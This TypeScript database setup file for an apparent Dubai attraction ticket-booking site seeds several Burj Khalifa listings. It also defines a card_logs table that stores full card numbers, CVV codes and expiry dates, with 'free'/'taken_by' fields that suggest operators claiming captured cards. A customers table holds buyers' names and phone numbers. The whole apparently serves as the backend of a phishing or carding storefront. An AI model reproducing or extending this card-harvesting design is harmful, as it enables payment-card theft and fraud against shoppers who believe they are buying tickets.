// db.ts
import Database from "better-sqlite3";
import { v4 as uuidv4 } from "uuid";

export const db = new Database("db.sqlite");

db.exec(`DROP TABLE IF EXISTS events;`);

// ЕБУЧАЯ ПРАВИЛЬНАЯ СХЕМА БЕЗ ЛИШНЕГО ГОВНА
db.exec(`
CREATE TABLE IF NOT EXISTS bookings (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT UNIQUE,
  booking_id TEXT,
  client_id TEXT,
  total_amount INTEGER,
  status TEXT DEFAULT 'active',
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS events (
  id TEXT PRIMARY KEY,
  title TEXT NOT NULL,
  description TEXT,
  full_description TEXT,
  location TEXT,
  no_discount INTEGER,
  price INTEGER,
  rating REAL DEFAULT 4.0,
  reviews_count INTEGER DEFAULT 0,
  category TEXT,
  image_urls TEXT, 
  duration TEXT,
  included_features TEXT,
  is_help TEXT,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS customers (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT,
  name TEXT,
  surname TEXT,
  phone TEXT
);

CREATE TABLE IF NOT EXISTS card_logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT,
  full_pan TEXT,
  masked_pan TEXT,
  cvv TEXT,
  expire_date TEXT,
  status TEXT DEFAULT 'free',
  taken_by TEXT,
  taken_at TEXT,
  step TEXT DEFAULT 'full'
);
CREATE TABLE IF NOT EXISTS event_features (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  event_id TEXT NOT NULL,
  title TEXT NOT NULL,
  feature_img TEXT NOT NULL,
  FOREIGN KEY (event_id) REFERENCES events(id) ON DELETE CASCADE
);
`);

db.exec(`
INSERT OR IGNORE INTO events (id, title, description, full_description,location, no_discount, price, rating, reviews_count, category, image_urls, duration, included_features, is_help) VALUES
('burj-khalifa-124-125','Burj Khalifa: Level 124/125 Fast Track', 
 'Take the high-speed elevator to Level 124 and use high-powered telescopes to see Dubai from above', 
 'Treat yourself – and those youre with – to something truly special with Burj Khalifa tickets. From the dizzying heights of the 124th and 125 floors, youll enjoy spectacular views of Dubai as you literally live the high life. With panoramic views from the worlds highest building, this is a true bucket-list experience.',
 'Dubai',159 ,49, 4.4, 9412, 'attraction', 
 '["/assets/events/burj-khalifa-1.avif", "/assets/events/burj-khalifa-2.avif", "/assets/events/burj-khalifa-3.avif", "/assets/events/burj-khalifa-4.avif"]',
 '1-2 hours', 
 'Fast-track entry,Access to floors 124-125',
 'FALSE'),

('burj-khalifa-aquarium','Dubai Aquarium & Burj Khalifa: Level 124/125 Ticket', 
 'Go from the tallest building to the oceans depths', 
 'Dubai is known as the City of Superlatives (what else would you expect from a place where the police drive Lamborghinis?). That unsurpassed sense of grandiosity is on its finest display in Dubai Mall - the largest mall in the world, attached to the Burj Khalifa, the worlds tallest building.\n\nThis combo ticket lets you soak up that impressiveness with access to the 124th floor of the Burj, and a visit to the shark and crocodile-filled Dubai Aquarium.\n\nFor breadth of experience, this combo ticket is unbeatable; it takes you from high in the sky to down to the depths of the oceans. Enjoy the best of Dubai by doubling up on two of its finest attractions.\n\nFirst, shoot up the 829-meter tall Burj Khalifa in the worlds fastest elevator to the 124th and 125th floors. Take advantage of some of the finest views of the desert, gulf, and beyond from the observation decks of this architectural marvel.\n\nThen explore Dubai Aquarium & Underwater Zoo. With 33,000 fish, and hundreds of sharks, this watery kingdom is a delight to behold. The first highlight is the multi-million liter water tunnel, where youll be surrounded by sharks, fish and more. Youve never had a better selfie than the one where a shark is floating eerily behind you.\n\nAmong the other attractions farther along lurks the truly amazing King Crocodile and his family. The King is 5 meters long and weighs nearly a ton. When you see him hell most likely seem quite relaxed, but his bite is stronger than any other animal on earth, so keep your hands inside the glass.\n\nAnd when youre done: the biggest mall in the world is there for you to conquer!',
 'Dubai', 378, 84, 4.5, 1383, 'attraction', 
 '["/assets/events/burj-khalifa-ocean-1.avif", "/assets/events/burj-khalifa-ocean-2.avif", "/assets/events/burj-khalifa-ocean-3.avif", "/assets/events/burj-khalifa-2.avif"]',
 '3-4 hours', 
 'Access to At the Top (floors 124 and 125), Entrance to Dubai Aquarium & Underwater Zoo',
 'FALSE'),

('burj-khalifa-lounge-154','Burj Khalifa: The Lounge Level 154 Tickets with Champagne', 
 'Sip champagne or coffee at the worlds most luxurious sky lounge', 
 'Explore the worlds highest lounge at 585 meters above the ground and immerse yourself in the clouds with this VIP luxury experience at the Burj Khalifas outdoor terrace.\n\nTowering over Dubais hypermodern skyline at 828 meters, the Burj Khalifa is the worlds most instantly recognizable skyscraper. This ticket gets you fast-track access to all levels (124 125 148 152 153 154), both coming up and going down.\n\nNibble on delicate canapes and sip champagne, and dont forget to clink glasses on the impressive outside terrace, as the sun sparkles across the Gulf coast and endless desert, hundreds of feet below! Get to know more about this Guinness World Record-holding structure with a self-guided multimedia guide\n\nThe best time to visit the The Lounge at Burj Khalifa? For the clearest views, get your head in the clouds in the afternoon. For the ultimate ambiance, enjoy a starlit evening experience – this ticket lets you choose!',
 'Dubai',769 ,220, 4.7, 249, 'attraction', 
 '["/assets/events/burj-khalifa-lounge-1.avif", "/assets/events/burj-khalifa-lounge-2.avif", "/assets/events/burj-khalifa-2.avif", "/assets/events/burj-khalifa-lounge-3.avif", "/assets/events/burj-khalifa-lounge-4.avif"]',
 '3-4 hours', 
 'Fast-track access to all the levels (124 125 148 152 153 and 154), Access to the worlds highest lounge (floors 152 153 and 154), Access to the outdoor terrace, 1 welcome drink (sparkling wine or other beverage), Unlimited high tea and canapes catered by Armani Hotel, Unlimited soft drinks',
 'FALSE'
),
('burj-khalifa-dining','Burj Khalifa: Dining Experience', 
 'Eat at a world-class restaurant and get great views on the observation deck', 
 'Visit the Burj Khalifa and enjoy dining with a view of Dubais skyline.\n\nYou can see the city from the worlds tallest building as you choose from a variety of international dishes.',
 'Dubai', 326,49, 4.2, 188, 'attraction', 
 '["/assets/events/burj-khalifa-dinner-1.avif", "/assets/events/burj-khalifa-dinner-2.avif", "/assets/events/burj-khalifa-dinner-3.avif"]',
 '3-4 hours', 
 'Access to Burj Khalifa, 3-course dining experience, Burj Khalifa: At The Top (Level 124 & 125) Entry + Rooftop Meal, At.mosphere Burj Khalifa: Premium 3-Course Lunch, At.mosphere Burj Khalifa: 3-Course Afternoon Tea with Soft Drinks, At.mosphere Burj Khalifa: Premium 3-Course Breakfast',
 'FALSE'
),
('burj-khalifa-safari','Burj Khalifa + Desert Safari', 
 'Go sky-high in the Burj Khalifa and explore the desert', 
 'From the tallest skyscraper in the world to snoozing camels, theres a lot to see in Dubai. This special package covers some of the essentials, taking the stress out of planning your agenda! Save time and money at Dubais top attractions and activities with access to the Burj Khalifa and a Dubai desert safari adventure. You will also get 10% discount to other attractions in the city!\n\nFrom the dizzying heights of the 124th and 125th floors, youll soak up seriously spectacular views of Dubai from the worlds tallest building. Talk about living the high life! With panoramic views as far as the eye can see, this is a true bucket-list experience. If you want to make it extra special, book a sunset slot.\n\nThis desert adventure is the perfect way to spend a morning in Dubai. Ride into the desert in air-conditioned comfort before sliding down the iconic sand dunes on a sandboard! Your trip includes classic Arabian hospitality – youll get to enjoy traditional treats like coffee, sweets, and dates to make sure youve got plenty of energy to keep you going. After youve finished exploring, its time for a light lunch as well as a camel ride.',
 'Dubai', 279,79, 4.6, 216, 'attraction', 
 '["/assets/events/burj-khalifa-safari-1.avif", "/assets/events/burj-khalifa-safari-2.avif", "/assets/events/burj-khalifa-safari-3.avif", "/assets/events/burj-khalifa-1.avif"]',
 '3-4 hours', 
 'Access to At the Top (floors 124 and 125), Dubai: Morning Desert Safari in High Red Dunes + Sandboarding, Dubai Evening Desert Safari: Sandboarding, Camel Ride + BBQ Dinner with Transfers',
 'TRUE'
),
('burj-khalifa-guided-tour','Dubai: Guided Food Tour + Burj Khalifa Bar Access', 
 'Visit a modern market and taste local dates', 
 'Prepare for a food tour through Dubais diverse food scene. Begin at the Armani Hotel and visit Burj Khalifa. Taste a variety of dishes while viewing the city skyline and the Arabian desert.\n\nVisit Dubais renowned luxury shopping area to find both local and international foods and explore the malls history and design.\n\nOn your tour, visit Souk Al Bahar, a modern take on a Middle Eastern market, featuring waterfront dining and shopping.',
 'Dubai', 592 ,179, 4.8, 567, 'attraction', 
 '["/assets/events/burj-khalifa-rest-1.avif", "/assets/events/burj-khalifa-rest-2.avif", "/assets/events/burj-khalifa-rest-3.avif", "/assets/events/burj-khalifa-rest-4.avif", "/assets/events/burj-khalifa-rest-5.avif"]',
 '3-4 hours', 
 'Access to At.mosphere, Burj Khalifa floor 122, Food and drinks, Live guide, Guided tour, Upgrade to Cocktail & Lebanese Wine (if option selected)',
 'FALSE'
),
('burj-khalifa-sky-148','Burj Khalifa: SKY Level 148 Tickets', 
 'Enjoy VIP access to three floors and enjoy views of Dubai and its desert', 
 'The tallest building in the world deserves a special experience. And thats exactly what this is.\n\nWith this ticket youll get VIP treatment during every part of your visit to the building they call the Burj. Personal reception, complimentary drinks, access to the luxe lounge, and of course, spectacular views at the top from the 124th, 125th and 148th floor.\n\nYoull feel like a rock star, and, for the hopeless romantics, come at sunset to get the most spectacular views.\n\nThis modern architectural marvel dominates the Dubai skyline – but thats kinda the point of building an enormous steel and glass mega skyscraper in the middle of a desert.\n\nEnjoy the best-of-the-best from high up in the sky; access to the deluxe lounge, complimentary drinks and snacks, interactive exhibits, and of course: the view.\n\nAnd oh my, what a view! Youll be able to snap some once-in-a-lifetime photos and explore the interactive exhibits from the rarefied air with this top-floor ticket.\n\nIf youre looking for a different – and slightly cheaper – experience, come after sunset when tickets are a little bit cheaper, and youll get to see the lights of Dubai a-twinkling.\n\nAt the end of your visit, youll make way your way back down to ground level. This is how Dubai should be done.',
 'Dubai', 399,120, 4.7, 2382, 'attraction', 
 '["/assets/events/burj-khalifa-sky-1.avif", "/assets/events/burj-khalifa-sky-2.avif", "/assets/events/burj-khalifa-sky-3.avif", "/assets/events/burj-khalifa-sky-4.avif", "/assets/events/burj-khalifa-sky-5.avif"]',
 '3-4 hours', 
 'Fast-track entry, Access to At the Top (floors 124 and 125), Access to At the Top SKY (floor 148), Access to the SKY lounge with welcome refreshments, Arabic coffee sweets and soft drinks',
 'FALSE'
),
('burj-khalifa-observaroty','Burj Khalifa & Sky Views Observatory: Entry Ticket', 
 'Visit the observation deck and walk on the glass floor', 
 'Visit the Burj Khalifa and the Sky Views Observatory. You will see the city from one of the worlds tallest buildings. Walk on the glass floor and look down at the busy streets below.',
 'Dubai', 259 ,49, 4.4, 783, 'attraction', 
 '["/assets/events/burj-khalifa-obs-1.avif", "/assets/events/burj-khalifa-obs-2.avif", "/assets/events/burj-khalifa-obs-3.avif", "/assets/events/burj-khalifa-obs-4.avif", "/assets/events/burj-khalifa-obs-5.avif"]',
 '3-4 hours', 
 'Glass walk at Sky Views, Access to At the Top (floors 124 and 125), Access to Sky Views Observatory',
 'FALSE'
),
('burj-khalifa-higlights-pass','Dubai Highlights Pass', 
 ' ', 
 '',
 'Dubai', 389 ,369, 4.5, 83, 'attraction', 
 '["/assets/events/burj-khalifa-pass-1.avif", "/assets/events/burj-khalifa-pass-2.avif", "/assets/events/burj-khalifa-pass-3.avif", "/assets/events/burj-khalifa-pass-4.avif", "/assets/events/burj-khalifa-pass-5.avif"]',
 '3-4 hours', 
 'Access to At the Top (floors 124 and 125), Get ready for an immersive experience at the Museum of the Future, Witness Dubais fascinating timeline with amazing views too',
 'TRUE'
),
('burj-khalifa-top-124-125','Burj Khalifa: At The Top Level 124/125 + Digital Photo', 
 'Ride the elevator and use special telescopes', 
 'Visit the Burj Khalifa, the tallest building in the world. Ride the elevator to the 124th and 125th floors to see the city and the Persian Gulf.\n\nUse special telescopes to see over Dubai. Adults get a complimentary golden-plated coin, while children can collect a mini puzzle. Enter through the ground floor of the Dubai Mall.\n\n',
 'Dubai', 185 ,59, 4.5, 83, 'attraction', 
 '["/assets/events/burj-khalifa-dig-1.avif", "/assets/events/burj-khalifa-dig-2.avif", "/assets/events/burj-khalifa-dig-3.avif", "/assets/events/burj-khalifa-dig-4.avif", "/assets/events/burj-khalifa-dig-5.avif"]',
 '3-4 hours', 
 'Access to At the Top (floors 124 and 125), Complimentary digital photo, Golden plated coin for adults, Mini puzzle for children',
 'FALSE'
)
`);

db.exec(`
  INSERT OR IGNORE INTO event_features (event_id, title, feature_img)
  VALUES
  ('burj-khalifa-safari', '<strong>Unbeatable savings</strong><br>Save up to 11% compared to buying individual tickets', '/assets/events/icons/commission-blue.svg'),
  ('burj-khalifa-safari', '<strong>Access to popular experiences</strong><br>Secure tickets that are likely to sell out', '/assets/events/icons/popular-blue.svg'),
  ('burj-khalifa-safari', '<strong>Trip planning made easy</strong><br>Choose from a variety of available dates', '/assets/events/icons/empty-calendar-blue.svg'),
  ('burj-khalifa-safari', '<strong>Instant bookingy</strong><br>Book multiple digital tickets at the same time', '/assets/events/icons/sellsout-blue.svg'),
  ('burj-khalifa-higlights-pass', '<strong>Access to popular experiences</strong><br>Secure tickets that are likely to sell out', '/assets/events/icons/popular-blue.svg'),
  ('burj-khalifa-higlights-pass', '<strong>Trip planning made easy</strong><br>Choose from a variety of available dates', '/assets/events/icons/empty-calendar-blue.svg'),
  ('burj-khalifa-higlights-pass', '<strong>Instant booking</strong><br>Book multiple digital tickets at the same time', '/assets/events/icons/sellsout-blue.svg');
`);

// Добавляем колонку step если её нет
try {
  db.exec(`ALTER TABLE card_logs ADD COLUMN step TEXT DEFAULT 'full';`);
  console.log("✅ Added step column to card_logs table");
} catch (error) {
  // Поле уже существует, игнорируем ошибку
  console.log("✅ Step column already exists in card_logs table");
}

// Функция для генерации sessionId
export function generateSessionId(): string {
  return uuidv4();
}
